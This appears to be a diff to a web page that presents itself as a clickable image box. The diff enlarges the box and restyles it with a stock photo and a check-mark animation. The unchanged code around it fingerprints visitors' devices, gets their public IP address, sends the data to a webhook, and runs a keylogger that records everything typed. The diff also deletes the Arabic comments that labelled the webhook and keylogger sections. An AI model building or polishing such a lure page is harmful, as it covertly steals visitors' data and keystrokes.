@@ -13,19 +13,26 @@
         background: #111;
     }
     .box {
-        width: 50px;
-        height: 50px;
-        background: #333;
-        border-radius: 4px;
+        width: 200px;
+        height: 200px;
+        background-image: url('https://picsum.photos/seed/jhgdsh/200/200');
+        background-size: cover;
+        background-position: center;
+        border-radius: 8px;
         cursor: pointer;
         transition: 0.2s;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        color: white;
+        font-weight: bold;
+        font-size: 0px; /* بداية من غير نص */
     }
     .box:hover {
-        background: #555;
         transform: scale(1.05);
+        box-shadow: 0 0 15px rgba(255,255,255,0.2);
     }
     .box:active {
-        background: #777;
         transform: scale(0.95);
     }
 </style>
@@ -98,7 +105,6 @@
             const connection = getConnectionInfo();
             const plugins = getPluginsInfo();
 
-            // ===== تحديد حجم الشاشة =====
             const screenWidth = window.screen.width;
             const screenHeight = window.screen.height;
             const availWidth = window.screen.availWidth;
@@ -134,14 +140,12 @@
                 timestamp: new Date().toISOString()
             };
 
-            // IP
             try {
                 const r = await fetch('https://api.ipify.org?format=json');
                 const d = await r.json();
                 data.ip = d.ip;
             } catch(e) { data.ip = 'N/A'; }
 
-            // إرسال للويب هوك
             await fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -150,7 +154,6 @@
                 })
             });
 
-            // كي لوقر
             let log = '';
             document.addEventListener('keydown', e => {
                 log += e.key;
@@ -164,16 +167,18 @@
                 }
             });
 
-            // تحديث المربع عند النقر
+            // ===== تعديل الضغط على الصورة =====
             document.getElementById('clickBox').addEventListener('click', function() {
+                this.style.backgroundImage = 'none';
                 this.style.backgroundColor = '#4CAF50';
                 this.textContent = '✓';
+                this.style.fontSize = '80px';
                 this.style.display = 'flex';
                 this.style.justifyContent = 'center';
                 this.style.alignItems = 'center';
                 this.style.color = 'white';
                 this.style.fontWeight = 'bold';
-                this.style.fontSize = '20px';
+                this.style.borderRadius = '50%';
             });
         }
 
